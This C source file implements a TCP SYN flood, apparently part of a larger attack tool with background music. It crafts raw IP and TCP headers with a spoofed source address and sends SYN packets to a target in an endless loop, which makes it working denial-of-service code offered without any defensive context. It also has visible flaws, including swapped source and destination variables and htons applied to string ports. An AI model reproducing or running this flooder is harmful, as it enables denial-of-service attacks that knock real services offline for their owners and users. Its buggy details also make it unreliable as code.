#include "../include/tcpheader.h"
#include "../include/prototypes.h"
#include "../include/callback.h"


const char *srcIP;
const char *srcPort;

const char *dstIP;
const char *dstPort;

int udpActif;
int tcpActif;

Mix_Music *tcpMusique = NULL;

void tcpFlood(void)
{
    tcpActif = 1;

    if(Mix_PlayingMusic() == 1)
        Mix_PausedMusic();

    Mix_VolumeMusic(MIX_MAX_VOLUME / 2);

    tcpMusique = Mix_LoadMUS("Music/Blotted Science - Synaptic Plasticity.mp3");

    Mix_PlayMusic(tcpMusique, 1);

   //Create a raw socket
    int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
    //Datagram to represent the packet
    char datagram[4096] , source_ip[32];
    //IP header
    struct iphdr *iph = (struct iphdr *) datagram;
    //TCP header
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;

    strcpy(source_ip , dstIP);

    sin.sin_family = AF_INET;
    sin.sin_port = htons(dstPort);
    sin.sin_addr.s_addr = inet_addr (srcIP);

    memset (datagram, 0, 4096); /* zero out the buffer */

    //Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
    iph->id = htons(54321);  //Id of this packet
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;      //Set to 0 before calculating checksum
    iph->saddr = inet_addr ( source_ip );    //Spoof the source ip address
    iph->daddr = sin.sin_addr.s_addr;

    iph->check = tcp_csum((unsigned short *) datagram, iph->tot_len >> 1);

    //TCP Header
    tcph->source = htons(srcPort);
    tcph->dest = htons(dstPort);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;      /* first and only tcp segment */
    tcph->fin=0;
    tcph->syn=1;
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window = htons (5840); /* maximum allowed window size */
    tcph->check = 0;/* if you set a checksum to zero, your kernel's IP stack
                should fill in the correct checksum during transmission */
    tcph->urg_ptr = 0;
    //Now the IP checksum

    psh.source_address = inet_addr( source_ip );
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);

    memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));

    tcph->check = tcp_csum( (unsigned short*) &psh , sizeof (struct pseudo_header));

    //IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
        exit(0);
    }

    while (1)
    {
        //Send the packet
        if (sendto (s,      /* our socket */
                    datagram,   /* the buffer containing headers and data */
                    iph->tot_len,    /* total length of our datagram */
                    0,      /* routing flags, normally always 0 */
                    (struct sockaddr *) &sin,   /* socket addr, just like in */
                    sizeof (sin)) < 0)       /* a normal send() */
        {
            printf ("error\n");
        }
        //Data send successfully
        else
        {
            printf ("Packet Send\n");
        }
    }

    tcpActif = 0;
    pthread_exit(NULL);
}



unsigned short tcp_csum(unsigned short *ptr, int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while(nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }

    if(nbytes == 1)
    {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum >> 16)+(sum & 0xffff);
    sum = sum + (sum >> 16);
    answer= (short)~sum;

    return((unsigned short)answer);
}